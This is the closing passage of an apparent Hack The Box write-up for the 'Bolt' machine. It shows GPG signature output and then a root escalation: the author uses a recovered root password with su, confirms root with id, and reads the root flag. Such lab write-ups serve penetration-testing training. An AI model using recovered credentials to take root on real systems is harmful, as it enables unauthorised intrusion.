gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```

## Root Flag

We have another password, this time it's for root. We can switch user and grab the flag:

```text
eddie@bolt:~$ su
Password: 

root@bolt:/home/eddie# id
uid=0(root) gid=0(root) groups=0(root)

root@bolt:/home/eddie# cat /root/root.txt
<HIDDEN>
```
